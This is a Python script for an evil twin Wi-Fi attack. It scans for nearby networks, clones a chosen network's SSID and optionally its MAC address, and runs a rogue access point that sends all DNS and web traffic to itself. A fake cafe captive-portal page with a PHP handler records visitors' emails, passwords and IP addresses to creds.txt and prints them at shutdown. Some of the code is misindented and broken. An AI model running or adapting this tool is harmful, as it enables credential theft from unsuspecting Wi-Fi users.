
#!/usr/bin/env python3

import os
import subprocess
import time
import csv
import glob
import sys
import signal
import shutil
import threading
import importlib.util
import tempfile


# Physical interface name (usually wlan0)
PHY_INTERFACE = "wlan0" 
FAKE_IP = "10.0.0.1"
DHCP_RANGE = "10.0.0.10,10.0.0.50,12h"
SCAN_PREFIX = "target_scan"

class FakeAP:
    def __init__(self):
        self.target_ssid = None
        self.target_channel = None
        self.target_bssid = None
        self.mon_interface = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.mac_spoofed = False

    def check_root(self):
        if os.geteuid() != 0:
            print("[!] Must run as root (sudo).")
            sys.exit(1)

    def check_tools(self):
        required = ["hostapd", "dnsmasq", "airmon-ng", "airodump-ng", "macchanger", "lighttpd"]
        missing = [t for t in required if not shutil.which(t)]
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            print("Install them: sudo apt install hostapd dnsmasq aircrack-ng")
            sys.exit(1)

#First we scan for available networks to check which network to copy
    def start_monitor_mode(self):
        print("[*] Enabling Monitor Mode for scanning...")
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Start airmon-ng
        subprocess.run(["airmon-ng", "start", PHY_INTERFACE], capture_output=True, text=True)
        
        # Detect the new monitor interface name (usually wlan0mon)
        self.mon_interface = PHY_INTERFACE + "mon"
        
        # Verify it exists, otherwise assume it stayed as wlan0
        if not os.path.exists(f"/sys/class/net/{self.mon_interface}"):
            self.mon_interface = PHY_INTERFACE

        print(f"[+] Monitor interface active: {self.mon_interface}")

    def should_mac_spoof(self):  # ADD THIS METHOD
        """Ask user if they want to spoof MAC address"""
        response = input("\n[?] Spoof MAC address to match target BSSID? (y/N): ").strip().lower()
        return response == 'y'    
    
    def spoof_mac(self, target_bssid):
        """Clone the target AP's MAC address"""
        print(f"[*] Spoofing MAC address to {target_bssid}")
        subprocess.run(["ifconfig", PHY_INTERFACE, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["macchanger", "-m", target_bssid, PHY_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ifconfig", PHY_INTERFACE, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    def scan_for_targets(self):
        # Cleanup old scans
        for f in glob.glob(f"{SCAN_PREFIX}*"):
            try: os.remove(f)
            except: pass

        print("[*] Scanning for 10 seconds...")
        cmd = [
            "airodump-ng", self.mon_interface,
            "--write", SCAN_PREFIX,
            "--output-format", "csv"
        ]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            proc.terminate()
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()

    def select_target(self):
        files = glob.glob(f"{SCAN_PREFIX}-*.csv")
        if not files:
            print("[-] No scan data found.")
            return False
            
        latest_csv = max(files, key=os.path.getmtime)
        networks = []

        with open(latest_csv, newline='', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() in ["BSSID", "Station MAC", ""]: continue
                
                ssid = row[13].strip()
                if not ssid: continue

                networks.append({
                    "bssid": row[0].strip(),
                    "channel": row[3].strip(),
                    "enc": row[5].strip(),
                    "essid": ssid
                })

        if not networks:
            print("[-] No networks found.")
            return False

        print("\nID  CH   SSID")
        print("--  ---  --------------------")
        for i, net in enumerate(networks):
            print(f"{i:<3} {net['channel']:<4} {net['essid']}")

        while True:
            try:
                sel = input("\n[?] Select target ID: ")
                idx = int(sel)
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    self.target_ssid = target['essid']
                    self.target_channel = target['channel']
                    self.target_bssid = target['bssid'] 
                    return True
            except ValueError:
                pass
            print("Invalid selection.")

#Switch from Monitor mode to managed mode to allow for hosting of fake AP
    def stop_monitor_mode(self):
        """Stops monitor mode to free the card for Hostapd."""
        print("\n[*] Stopping Monitor Mode...")
        subprocess.run(["airmon-ng", "stop", self.mon_interface], stdout=subprocess.DEVNULL)
        
        # Restart network manager sometimes interferes, so we kill it again just in case
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Ensure phy interface is back
        time.sleep(2)
        print(f"[+] Reverted to managed mode on {PHY_INTERFACE}")

# Hosting the Fake AP , so devices can connect,
    def create_configs(self):
        print("[*] Generating hostapd config...")

        # Use exact SSID when MAC spoofing, otherwise add _Evil suffix for testing
        if self.mac_spoofed:
            ap_ssid = self.target_ssid
        else:
            ap_ssid = f"{self.target_ssid}_Evil"
        print(f"using ssid: {ap_ssid}")

        hostapd_conf = f"""
interface={PHY_INTERFACE}
driver=nl80211
hw_mode=g
ssid={ap_ssid}
channel={self.target_channel}
macaddr_acl=0
auth_algs=1
"""
        with open("hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""
interface={PHY_INTERFACE}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{FAKE_IP}
dhcp-option=6,{FAKE_IP}
address=/#/{FAKE_IP}
server=8.8.8.8
#address=
log-queries
log-dhcp
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

    def setup_networking(self):
        # Set IP for the interface
        print(f"[*] Setting gateway IP {FAKE_IP}...")
        subprocess.run(["ifconfig", PHY_INTERFACE, FAKE_IP, "netmask", "255.255.255.0", "up"])
        # Enable forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    def start_services(self):
        print("[+] Starting web server...")
        subprocess.run(["systemctl", "stop", "lighttpd"], stdout=subprocess.DEVNULL)
        subprocess.run(["systemctl", "start", "lighttpd"], stdout=subprocess.DEVNULL)
        
        print("[+] Starting DNSMASQ...")
        
        dnsmasq_conf = f"""
interface={PHY_INTERFACE}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{FAKE_IP}
dhcp-option=6,{FAKE_IP}
address=/#/{FAKE_IP}
server=8.8.8.8
log-queries
log-dhcp
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)
        
        self.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", "dnsmasq.conf", "-d"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE
        )

        print("[+] Starting HOSTAPD (Fake AP)...")
        print(f"\n[!] EVIL TWIN LIVE: '{self.target_ssid}' on Channel {self.target_channel}")
        print("[!] Logs (Connections will appear below):\n")
        
        # Piping stdout to console so user sees connections
        self.hostapd_proc = subprocess.Popen(
            ["hostapd", "hostapd.conf"],
            stdout=sys.stdout,
            stderr=sys.stderr
        )

        try:
            self.hostapd_proc.wait()
        except KeyboardInterrupt:
            pass  

    def cleanup(self):
        print("\n[*] Shutting down...")
        if self.hostapd_proc: 
        	self.hostapd_proc.terminate()
        	self.hostapd_proc.wait()
        if self.dnsmasq_proc:
        	self.dnsmasq_proc.terminate()
        	self.dnsmasq_proc.wait()
        
        # Remove iptables rules
        #os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
        #os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
        #os.system("iptables -D FORWARD -p tcp --dport 80 -j ACCEPT 2>/dev/null")
        #os.system("iptables -D FORWARD -p tcp --dport 443 -j ACCEPT 2>/dev/null")
        
        # Stop web server
        subprocess.run(["systemctl", "stop", "lighttpd"], stdout=subprocess.DEVNULL)
        
        os.system("iptables -F")
        os.system("iptables -t nat -F")
        os.system("echo > /proc/sys/net/ipv4/ip_forward")
        
        # Remove configs
        if os.path.exists("hostapd.conf"): os.remove("hostapd.conf")
        if os.path.exists("dnsmasq.conf"): os.remove("dnsmasq.conf")
        
        subprocess.run(["macchanger", "-p", PHY_INTERFACE], stdout=subprocess.DEVNULL)
        
        # Reset IP
        subprocess.run(["ifconfig", PHY_INTERFACE, "down"])
        subprocess.run(["ifconfig", PHY_INTERFACE, "up"])

        # Display captured credentials summary
        if os.path.exists("/var/www/html/creds.txt"):
            print("\n[*] Captured credentials saved to: /var/www/html/creds.txt")
            try:
                with open("/var/www/html/creds.txt", "r") as f:
                    content = f.read()
                    if content.strip():
                        print("[+] Credentials captured:")
                        print("="*60)
                        print(content)
                        print("="*60)
                    else:
                        print("[-] No credentials were captured")
            except Exception as e:
                print(f"[!] Could not read credentials file: {e}")

        print("[+] Done.")

    #Capture portal/ phishing part
    def set_captive_portal(self):
        subprocess.run(["apt-get", "install", "-y", "lighttpd", "php-cgi"], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #subprocess.run(["systemctl", "stop", "lighttpd"], 
        #           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        os.makedirs("/var/www/html", exist_ok=True)
        
        with open("/var/www/html/index.html", "w") as f:
            f.write("""
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cafe with Login</title>
    <link rel="stylesheet" href="css/w3.css">
    <link rel="stylesheet" href="css/fonts.css">
    <!-- Add the login styles -->
    <style>
        body, html {
            height: 100%;
            font-family: "Inconsolata", sans-serif;
        }

        .bgimg {
            background-position: center;
            background-size: cover;
            background-image: url("img/background_page.jpg");
            min-height: 75%;
        }

        .menu {
            display: none;
        }

        /* Adjust login page styling */
        .login-page {
            display: none;
            place-items: center;
            position: fixed;
            background-size: cover;
            background-image: url("img/background.jpeg");
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            overflow-y: auto;
        }

        .login-visible {
            display: grid;
        }

        /* Add login button to navigation */
        .w3-top .w3-col.s4 {
            width: 25%;
        }

        @media (max-width: 600px) {
            .w3-top .w3-col.s4 {
                width: 25%;
            }
        }
    </style>
</head>
<body>

    <!-- Login Page (initially hidden) -->
    <div id="loginPage" class="login-page">
        <div class="soft-background">
            <div class="floating-shapes">
                <div class="soft-blob blob-1"></div>
                <div class="soft-blob blob-2"></div>
                <div class="soft-blob blob-3"></div>
                <div class="soft-blob blob-4"></div>
            </div>
        </div>

        <div class="login-container">
            <div class="soft-card">
                <button class="w3-button w3-display-topright w3-large w3-circle w3-black" 
                        style="margin: 20px; z-index: 1001;" 
                        onclick="closeLogin()">&times;</button>
                
                <div class="comfort-header">
                    <div class="gentle-logo">
                        <div class="logo-circle">
                            <div class="comfort-icon">
                                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                                    <path d="M16 2C8.3 2 2 8.3 2 16s6.3 14 14 14 14-6.3 14-14S23.7 2 16 2z" fill="none" stroke="currentColor" stroke-width="1.5"/>
                                    <path d="M12 16a4 4 0 108 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                                    <circle cx="12" cy="12" r="1.5" fill="currentColor"/>
                                    <circle cx="20" cy="12" r="1.5" fill="currentColor"/>
                                </svg>
                            </div>
                            <div class="gentle-glow"></div>
                        </div>
                    </div>
                    <h1 class="comfort-title">Welcome to The Cafe</h1>
                    <p class="gentle-subtitle">Sign in to reserve tables and order online!</p>
                </div>
                
                <form class="comfort-form" id="loginForm" action="/login.php" method="POST" novalidate>
                    <div class="soft-field">
                        <div class="field-container">
                            <input type="email" id="email" name="email" required autocomplete="email">
                            <label for="email">Email address</label>
                            <div class="field-accent"></div>
                        </div>
                        <span class="gentle-error" id="emailError"></span>
                    </div>

                    <div class="soft-field">
                        <div class="field-container">
                            <input type="password" id="password" name="password" required autocomplete="current-password">
                            <label for="password">Password</label>
                            <button type="button" class="gentle-toggle" id="passwordToggle" aria-label="Toggle password visibility">
                                <div class="toggle-icon">
                                    <svg class="eye-open" width="20" height="20" viewBox="0 0 20 20" fill="none">
                                        <path d="M10 3c-4.5 0-8.3 3.8-9 7 .7 3.2 4.5 7 9 7s8.3-3.8 9-7c-.7-3.2-4.5-7-9-7z" stroke="currentColor" stroke-width="1.5" fill="none"/>
                                        <circle cx="10" cy="10" r="3" stroke="currentColor" stroke-width="1.5" fill="none"/>
                                    </svg>
                                    <svg class="eye-closed" width="20" height="20" viewBox="0 0 20 20" fill="none">
                                        <path d="M3 3l14 14M8.5 8.5a3 3 0 004 4m2.5-2.5C15 10 12.5 7 10 7c-.5 0-1 .1-1.5.3M10 13c-2.5 0-4.5-2-5-3 .3-.6.7-1.2 1.2-1.7" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                                    </svg>
                                </div>
                            </button>
                            <div class="field-accent"></div>
                        </div>
                        <span class="gentle-error" id="passwordError"></span>
                    </div>

                    <div class="comfort-options">
                        <label class="gentle-checkbox">
                            <input type="checkbox" id="remember" name="remember">
                            <span class="checkbox-soft">
                                <div class="check-circle"></div>
                                <svg class="check-mark" width="12" height="10" viewBox="0 0 12 10" fill="none">
                                    <path d="M1 5l3 3 7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                </svg>
                            </span>
                            <span class="checkbox-text">Remember me</span>
                        </label>
                        <a href="#" class="comfort-link">Forgot password?</a>
                    </div>

                    <button type="submit" class="comfort-button">
                        <div class="button-background"></div>
                        <span class="button-text">Sign in</span>
                        <div class="button-loader">
                            <div class="gentle-spinner">
                                <div class="spinner-circle"></div>
                            </div>
                        </div>
                        <div class="button-glow"></div>
                    </button>
                </form>

                <div class="gentle-divider">
                    <div class="divider-line"></div>
                    <span class="divider-text">or continue with</span>
                    <div class="divider-line"></div>
                </div>

                <div class="comfort-social">
                    <button type="button" class="social-soft">
                        <div class="social-background"></div>
                        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                            <path d="M9 7.4v3.2h4.6c-.2 1-.8 1.8-1.6 2.4v2h2.6c1.5-1.4 2.4-3.4 2.4-5.8 0-.6 0-1.1-.1-1.6H9z" fill="#4285F4"/>
                            <path d="M9 17c2.2 0 4-0.7 5.4-1.9l-2.6-2c-.7.5-1.6.8-2.8.8-2.1 0-3.9-1.4-4.6-3.4H1.7v2.1C3.1 15.2 5.8 17 9 17z" fill="#34A853"/>
                            <path d="M4.4 10.5c-.2-.5-.2-1.1 0-1.6V6.8H1.7c-.6 1.2-.6 2.6 0 3.8l2.7-2.1z" fill="#FBBC04"/>
                            <path d="M9 4.2c1.2 0 2.3.4 3.1 1.2l2.3-2.3C12.9 1.8 11.1 1 9 1 5.8 1 3.1 2.8 1.7 5.4l2.7 2.1C5.1 5.6 6.9 4.2 9 4.2z" fill="#EA4335"/>
                        </svg>
                        <span>Google</span>
                        <div class="social-glow"></div>
                    </button>
                    
                    <button type="button" class="social-soft">
                        <div class="social-background"></div>
                        <svg width="18" height="18" viewBox="0 0 18 18" fill="#1877F2">
                            <path d="M18 9C18 4.03 13.97 0 9 0S0 4.03 0 9c0 4.49 3.29 8.21 7.59 9v-6.37H5.31V9h2.28V7.02c0-2.25 1.34-3.49 3.39-3.49.98 0 2.01.18 2.01.18v2.21h-1.13c-1.11 0-1.46.69-1.46 1.4V9h2.49l-.4 2.63H10.4V18C14.71 17.21 18 13.49 18 9z"/>
                        </svg>
                        <span>Facebook</span>
                        <div class="social-glow"></div>
                    </button>
                </div>

                <div class="comfort-signup">
                    <span class="signup-text">Don't have an account?</span>
                    <a href="#" class="comfort-link signup-link" onclick="showSignup()">Sign up</a>
                </div>

                <div class="gentle-success" id="successMessage" style="display: none;">
                    <div class="success-bloom">
                        <div class="bloom-rings">
                            <div class="bloom-ring ring-1"></div>
                            <div class="bloom-ring ring-2"></div>
                            <div class="bloom-ring ring-3"></div>
                        </div>
                        <div class="success-icon">
                            <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                                <path d="M8 14l5 5 11-11" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                    </div>
                    <h3 class="success-title">Welcome!</h3>
                    <p class="success-desc">Taking you back to the cafe...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Cafe Website Content -->
    <!-- Links (sit on top) -->
    <div class="w3-top">
        <div class="w3-row w3-padding w3-black">
            <div class="w3-col s3">
                <a href="#" class="w3-button w3-block w3-black">HOME</a>
            </div>
            <div class="w3-col s3">
                <a href="#about" class="w3-button w3-block w3-black">ABOUT</a>
            </div>
            <div class="w3-col s3">
                <a href="#menu" class="w3-button w3-block w3-black">MENU</a>
            </div>
            <div class="w3-col s3">
                <a href="#where" class="w3-button w3-block w3-black">WHERE</a>
            </div>
            <div class="w3-col s3">
                <a href="javascript:void(0)" class="w3-button w3-block w3-black" onclick="openLogin()">LOGIN</a>
            </div>
        </div>
    </div>

    <!-- Header with image -->
    <header class="bgimg w3-display-container w3-grayscale-min" id="home">
        <div class="w3-display-bottomleft w3-center w3-padding-large w3-hide-small">
            <span class="w3-tag">Open from 6am to 5pm</span>
        </div>
        <div class="w3-display-middle w3-center">
            <span class="w3-text-white" style="font-size:90px">the<br>Cafe</span>
        </div>
        <div class="w3-display-bottomright w3-center w3-padding-large">
            <span class="w3-text-white">15 Adr street, 5015</span>
        </div>
    </header>

    <!-- WiFi Access Notice Banner -->
    <div class="w3-container w3-amber w3-padding" style="position: sticky; top: 52px; z-index: 999;">
        <div class="w3-content" style="max-width:700px">
            <p class="w3-center" style="margin: 8px 0;">
                <strong>📶 Free WiFi Available!</strong><br>
                <span style="font-size: 0.9em;">To access the internet or place online orders, please <a href="javascript:void(0)" onclick="openLogin()" style="text-decoration: underline; color: #000; font-weight: bold;">login to our service portal</a>.</span>
            </p>
        </div>
    </div>

    <!-- Add a background color and large text to the whole page -->
    <div class="w3-sand w3-grayscale w3-large">

        <!-- About Container -->
        <div class="w3-container" id="about">
            <div class="w3-content" style="max-width:700px">
                <h5 class="w3-center w3-padding-64"><span class="w3-tag w3-wide">ABOUT THE CAFE</span></h5>
                <p>The Cafe was founded in blabla by Mr. Smith in lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
                <p>In addition to our full espresso and brew bar menu, we serve fresh made-to-order breakfast and lunch sandwiches, as well as a selection of sides and salads and other good stuff.</p>
                <div class="w3-panel w3-leftbar w3-light-grey">
                    <p><i>"Use products from nature for what it's worth - but never too early, nor too late." Fresh is the new sweet.</i></p>
                    <p>Chef, Coffeeist and Owner: Liam Brown</p>
                </div>
                <img src="img/pic2.jpg" style="width:100%;max-width:1000px" class="w3-margin-top">
                <p><strong>Opening hours:</strong> everyday from 6am to 5pm.</p>
                <p><strong>Address:</strong> 15 Adr street, 5015, NY</p>
            </div>
        </div>

        <!-- Menu Container -->
        <div class="w3-container" id="menu">
            <div class="w3-content" style="max-width:700px">
                <h5 class="w3-center w3-padding-48"><span class="w3-tag w3-wide">THE MENU</span></h5>
            
                <div class="w3-row w3-center w3-card w3-padding">
                    <a href="javascript:void(0)" onclick="openMenu(event, 'Eat');" id="myLink">
                        <div class="w3-col s6 tablink">Eat</div>
                    </a>
                    <a href="javascript:void(0)" onclick="openMenu(event, 'Drinks');">
                        <div class="w3-col s6 tablink">Drink</div>
                    </a>
                </div>

                <div id="Eat" class="w3-container menu w3-padding-48 w3-card">
                    <h5>Bread Basket</h5>
                    <p class="w3-text-grey">Assortment of fresh baked fruit breads and muffins 5.50</p><br>
                    
                    <h5>Honey Almond Granola with Fruits</h5>
                    <p class="w3-text-grey">Natural cereal of honey toasted oats, raisins, almonds and dates 7.00</p><br>
                    
                    <h5>Belgian Waffle</h5>
                    <p class="w3-text-grey">Vanilla flavored batter with malted flour 7.50</p><br>
                    
                    <h5>Scrambled eggs</h5>
                    <p class="w3-text-grey">Scrambled eggs, roasted red pepper and garlic, with green onions 7.50</p><br>
                    
                    <h5>Blueberry Pancakes</h5>
                    <p class="w3-text-grey">With syrup, butter and lots of berries 8.50</p>
                </div>

                <div id="Drinks" class="w3-container menu w3-padding-48 w3-card">
                    <h5>Coffee</h5>
                    <p class="w3-text-grey">Regular coffee 2.50</p><br>
                    
                    <h5>Chocolato</h5>
                    <p class="w3-text-grey">Chocolate espresso with milk 4.50</p><br>
                    
                    <h5>Corretto</h5>
                    <p class="w3-text-grey">Whiskey and coffee 5.00</p><br>
                    
                    <h5>Iced tea</h5>
                    <p class="w3-text-grey">Hot tea, except not hot 3.00</p><br>
                    
                    <h5>Soda</h5>
                    <p class="w3-text-grey">Coke, Sprite, Fanta, etc. 2.50</p>
                </div>  
                <img src="img/pic1.jpg" style="width:100%;max-width:1000px;margin-top:32px;">
            </div>
        </div>

        <!-- Contact/Area Container -->
        <div class="w3-container" id="where" style="padding-bottom:32px;">
            <div class="w3-content" style="max-width:700px">
                <h5 class="w3-center w3-padding-48"><span class="w3-tag w3-wide">WHERE TO FIND US</span></h5>
                <p>Find us at some address at some place.</p>
                <img src="img/pic2.jpg" class="w3-image" style="width:100%">
                <p><span class="w3-tag">FYI!</span> We offer full-service catering for any event, large or small. We understand your needs and we will cater the food to satisfy the biggerst criteria of them all, both look and taste.</p>
                <p><strong>Reserve</strong> a table by signing up!</p>
            </div>
        </div>

        <!-- End page content -->
    </div>
    
    <!-- Footer -->
    <footer class="w3-center w3-light-grey w3-padding-48 w3-large">
        <p>Powered by <a href="https://www.w3schools.com/w3css/default.asp" title="W3.CSS" target="_blank" class="w3-hover-text-green">w3.css</a></p>
    </footer>

    <script src="../../shared/js/form-utils.js"></script>
    <script>
        // Tabbed Menu for cafe
        function openMenu(evt, menuName) {
            var i, x, tablinks;
            x = document.getElementsByClassName("menu");
            for (i = 0; i < x.length; i++) {
                x[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablink");
            for (i = 0; i < x.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" w3-dark-grey", "");
            }
            document.getElementById(menuName).style.display = "block";
            evt.currentTarget.firstElementChild.className += " w3-dark-grey";
        }
        document.getElementById("myLink").click();

        // Login Page Functions
        function openLogin() {
            document.getElementById('loginPage').classList.add('login-visible');
            document.body.style.overflow = 'hidden'; // Prevent scrolling behind login
        }

        function closeLogin() {
            document.getElementById('loginPage').classList.remove('login-visible');
            document.body.style.overflow = 'auto'; // Restore scrolling
        }

        function showSignup() {
            // You can implement signup functionality here
            alert('Sign up functionality would go here!');
        }

        // Close login when clicking outside the login container
        document.getElementById('loginPage').addEventListener('click', function(e) {
            if (e.target.id === 'loginPage') {
                closeLogin();
            }
        });

        // Add login form functionality
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Simple validation
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            
            let isValid = true;
            
            // Clear previous errors
            emailError.textContent = '';
            passwordError.textContent = '';
            
            // Email validation
            if (!email) {
                emailError.textContent = 'Email is required';
                isValid = false;
            } else if (!/\\S+@\\S+\\.\\S+/.test(email)) {
                emailError.textContent = 'Please enter a valid email';
                isValid = false;
            }
            
            // Password validation
            if (!password) {
                passwordError.textContent = 'Password is required';
                isValid = false;
            } else if (password.length < 6) {
                passwordError.textContent = 'Password must be at least 6 characters';
                isValid = false;
            }
            
            if (isValid) {
                // Show loading state
                
                
          	this.submit();
            }
        });

        // Password toggle functionality
        document.getElementById('passwordToggle').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const eyeOpen = this.querySelector('.eye-open');
            const eyeClosed = this.querySelector('.eye-closed');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeOpen.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeOpen.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        });
    </script>

</body>
</html>    
                    """)
        
        php_capture = """<?php
        session_start();
        
        error_reporting(E_ALL);
        ini_set('display_errors',1);
        
	$log_file='/var/www/html/creds.txt';
	
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $email = $_POST["email"] ?? '';
            $password = $_POST["password"] ?? '';
            
            if($email == '' && $password == ''){
            	header('Location: /index.html');
            	exit;
            }
            
            $log_entry = date('Y-m-d H:i:s') . "| IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "| Email: " . ($_POST["email"] ?? '') . "| Password: " . ($_POST["password"] ?? '') . PHP_EOL;
            
            file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
            
            // Redirect back or show success
            header('Location: /success.html');
            exit;
            }
            
            header('Location: /index.html');
            exit;
        
        ?>
        """
    
        with open("/var/www/html/login.php", "w") as f:
           f.write(php_capture)
        
        

    success_html = """<!DOCTYPE html>
    <html>
    <head>
    <title>Access Granted</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 36px;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            max-width: 600px;
            line-height: 1.6;
        }
        .spinner {
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 5px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-top: 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>WiFi Access Granted!</h1>
    <p>You are now connected to the network. You should have internet access shortly.</p>
    <p><small>This page will redirect automatically in a few seconds...</small></p>
    <div class="spinner"></div>
    
    <script>
    // Redirect to a real site after 5 seconds
    setTimeout(() => {
        window.location.href = '/index.html';
    }, 3000);
    </script>
</body>
</html>"""
    
    with open("/var/www/html/success.html", "w") as f:
        	f.write(success_html)
    
    subprocess.run(["chmod", "-R", "755", "/var/www/html"])
    subprocess.run(["chown", "-R", "www-data:www-data", "/var/www/html"])

    # Create/clear credentials file with proper permissions
    print("[*] Creating credentials file...")
    # Clear any existing credentials from previous runs
    with open("/var/www/html/creds.txt", "w") as f:
        f.write("")  # Empty file
    subprocess.run(["chown", "www-data:www-data", "/var/www/html/creds.txt"])
    subprocess.run(["chmod", "664", "/var/www/html/creds.txt"])
    print("[+] Credentials file cleared and ready: /var/www/html/creds.txt")

    print("[+] Capture portal pages created")
    #subprocess.run(["systemctl", "start", "lighttpd"], 
    #               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    #time.sleep(2)
    
    def setup_iptables(self):
    	print("[*] setting up iptables rules...")
    	
    	os.system("iptables -F")
    	os.system("iptables -t nat -F")
    	
    	os.system(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    	os.system(f"iptables -A FORWARD -i {PHY_INTERFACE} -o eth0 -j ACCEPT")
    	os.system(f"iptables -A FORWARD -i eth0 -o {PHY_INTERFACE} -m state --state RELATED,ESTABLISHED -j ACCEPT")
    	
    	os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80")
    	os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80")
    	
    
    	print("[+] iptables rules configured")
    	#print(f"[+] Credentials will be saved to: /tmp/creds.log")
    	
    
    def run(self):
        self.check_root()
        self.check_tools()
        
        try:
            # Scan Phase
            self.start_monitor_mode()
            self.scan_for_targets()
            if not self.select_target():
                self.stop_monitor_mode()
                return
                
            # MAC spoofing
            if self.should_mac_spoof():
                self.spoof_mac(self.target_bssid)
                self.mac_spoofed = True

            # Transition
            self.stop_monitor_mode()

            # Attack Phase
            self.create_configs()
            print("[*] setting up captive portal...")
            self.set_captive_portal()
            self.setup_networking()
            
            print("[*] Generating hostapd config...")

            # Use exact SSID when MAC spoofing, otherwise add _Evil suffix for testing
            if self.mac_spoofed:
                ap_ssid = self.target_ssid
            else:
                ap_ssid = f"{self.target_ssid}_Evil"
            print(f"using ssid: {ap_ssid}")
        
            hostapd_conf = f"""
interface={PHY_INTERFACE}
driver=nl80211
hw_mode=g
ssid={ap_ssid}
channel={self.target_channel}
macaddr_acl=0
auth_algs=1
"""
            with open("hostapd.conf", "w") as f:
            		f.write(hostapd_conf)
            
            self.setup_iptables()
            self.start_services()
            #self.set_captive_portal()
        
        except Exception as e:
            print(f"\n[!] Unexpected Error: {e}")
        finally:
            self.cleanup()

if __name__ == "__main__":
    FakeAP().run()
